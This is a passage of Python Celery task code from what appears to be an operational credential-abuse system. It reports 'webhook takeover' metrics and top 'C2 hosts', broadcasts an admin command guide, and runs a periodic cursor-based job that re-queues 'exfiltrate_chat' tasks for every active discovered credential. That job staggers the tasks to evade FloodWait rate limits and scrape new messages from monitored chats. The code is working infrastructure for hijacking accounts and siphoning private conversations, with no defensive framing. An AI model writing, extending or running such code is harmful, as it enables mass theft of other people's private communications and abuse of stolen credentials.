                host_counter[host] += 1
        except Exception:
            continue

    top_hosts = host_counter.most_common(10)

    lines = [
        "📌 **Webhook Takeover Metrics**",
        "",
        f"• Credentials with captured webhook: {captured_count}",
        f"• Pinned in-topic: {pinned_count} ({coverage_pct:.1f}% coverage)",
        "",
    ]
    if top_hosts:
        lines.append("**Top C2 hosts (recent 400):**")
        for host, count in top_hosts:
            lines.append(f"• `{host}` × {count}")

    msg = "\n".join(lines)[:3900]
    try:
        await get_broadcaster().send_log(msg)
    except Exception as e:
        return {"status": "broadcast_failed", "error": str(e)[:200]}

    return {
        "status": "ok",
        "captured": captured_count,
        "pinned": pinned_count,
        "top_hosts": len(top_hosts),
    }


@app.task(name="flow.system_help")
def system_help():
    """Periodic guide on how to use system commands."""
    msg = (
        "ℹ️ **System Commands Guide**\n"
        "You can control the system using these commands:\n\n"
        "• `/status` - View queue size, DB connectivity, and paused state.\n"
        "• `/pause` - Suspend all scanners and broadcasters (Maintenance Mode).\n"
        "• `/resume` - Resume normal operations.\n"
        "• `/restart` - Restart the Bot Listener process.\n\n"
        "_Commands are restricted to Admins and Whitelisted Users._"
    )
    from app.workers.celery_app import get_worker_loop
    get_worker_loop().run_until_complete(get_broadcaster().send_log(msg))
    return "Help guide sent."


@app.task(name="flow.rescrape_active")
def rescrape_active():
    """
    Periodic task to re-scrape all active credentials for new messages.
    Runs every 4 hours to catch new activity in monitored chats.
    """
    from app.workers.celery_app import get_worker_loop
    return get_worker_loop().run_until_complete(_rescrape_active_logic())


async def _rescrape_active_logic():
    """
    Cursor-based rescrape: advances through ALL active credentials across successive runs.
    Each run processes one batch starting from where the previous run left off,
    ensuring every credential is eventually rescraped regardless of table size.
    """
    import os
    from app.core.metrics import metrics
    from app.core.redis_srv import redis_srv
    metrics.inc("rescrape.started")

    BATCH_SIZE = int(os.getenv("RESCRAPE_BATCH_SIZE", 50))
    # Stagger task dispatch: spread BATCH_SIZE tasks across RESCRAPE_SPREAD_SECONDS
    # so they don't all hit the UserAgent simultaneously and trigger FloodWait.
    # Default: 50 tasks over 300s = one task every 6s.
    SPREAD_SECONDS = int(os.getenv("RESCRAPE_SPREAD_SECONDS", 300))
    # Backpressure threshold: skip queueing if the scrape queue already has this
    # many pending tasks.  exfiltrate_chat routes to the 'scrape' queue and each
    # task can hold a session lock for 30-300s.  Piling on more tasks while the
    # previous batch is still draining causes the session-acquisition retry loop
    # to spin at 0% CPU useful work and inflates scrape queue depth unboundedly.
    # Default: 2 × BATCH_SIZE (allow one overlap batch in flight, then gate).
    BACKPRESSURE_THRESHOLD = int(os.getenv("RESCRAPE_BACKPRESSURE_THRESHOLD", BATCH_SIZE * 2))
    CURSOR_KEY = "rescrape:cursor:last_id"

    broadcaster = get_broadcaster()

    # Guard: if ALL UserAgent sessions are on cooldown, skip this run entirely.
    # Queueing tasks when the UA is fully restricted just wastes worker slots and
    # causes noisy "All sessions failed" log spam.
    ua_sessions_available = False
    try:
        import os.path as _osp
        import glob
        session_files = glob.glob("/app/sessions/*.session")
        for sf in session_files:
            sname = _osp.splitext(_osp.basename(sf))[0]
            if not redis_srv.is_on_cooldown(f"user_agent:{sname}"):
                ua_sessions_available = True
                break
    except Exception:
        ua_sessions_available = True  # fail open

    if not ua_sessions_available:
        msg = "⏳ **Re-scrape**: All UserAgent sessions on FloodWait cooldown — skipping this run to avoid task noise."
        logger.info(msg)
        await broadcaster.send_log(msg)
        return msg

    # Backpressure gate: don't pile new tasks onto an already-deep scrape queue.
    # exfiltrate_chat routes to the 'scrape' queue.  Each task can hold a session
    # lock for 30-300s, so a backlog of tasks just spins the session-acquisition
    # retry loop without making progress.
    try:
        scrape_queue_depth = redis_client.llen("scrape")
    except Exception:
        scrape_queue_depth = 0  # fail open — don't block rescrape on Redis errors

    if scrape_queue_depth >= BACKPRESSURE_THRESHOLD:
        msg = (
            f"⏸️ **Re-scrape**: Skipping — scrape queue has {scrape_queue_depth} pending tasks "
            f"(threshold: {BACKPRESSURE_THRESHOLD}).  Waiting for existing tasks to drain."
        )
        logger.info(msg)
        await broadcaster.send_log(msg)
        return msg

    # Read cursor from Redis — empty string means start of table
    last_id = redis_client.get(CURSOR_KEY) or ""

    try:
        query = (
            db.table("discovered_credentials")
            .select("id")
            .eq("status", "active")
            .not_.is_("chat_id", "null")
            .order("id", desc=False)
            .limit(BATCH_SIZE)
        )
        if last_id:
            query = query.gt("id", last_id)

        response = await async_execute(query)
        credentials = response.data or []

        if not credentials:
            # End of table — reset cursor so the next run starts over
            redis_client.delete(CURSOR_KEY)
            await broadcaster.send_log("🔄 **Re-scrape**: Full table scanned — cursor reset to start.")
            return "Rescrape cursor reset (full table covered)."

        # Advance cursor to last ID in this batch
        new_cursor = credentials[-1]["id"]
        redis_client.set(CURSOR_KEY, new_cursor)

        await broadcaster.send_log(
            f"🔄 **Re-scrape**: Queuing {len(credentials)} credentials (cursor: ...{new_cursor[-8:]}, "
            f"staggered over {SPREAD_SECONDS}s)..."
        )

        queued = 0
        interval = SPREAD_SECONDS / max(len(credentials), 1)
        for i, cred in enumerate(credentials):
            try:
                # countdown staggers each task: task 0 runs now, task 1 runs in interval*1s, etc.
                exfiltrate_chat.apply_async(args=[cred["id"]], countdown=int(i * interval))
                queued += 1
            except Exception as e:
                logger.error(f"Failed to queue exfiltration for {cred['id']}: {e}")

        msg = f"🏁 **Re-scrape**: Queued {queued}/{len(credentials)} credentials (spread: ~{interval:.0f}s apart)."
        await broadcaster.send_log(msg)
        return msg

    except Exception as e:
        error_msg = f"❌ **Re-scrape** failed: {e}"
        await broadcaster.send_log(error_msg)
        return error_msg
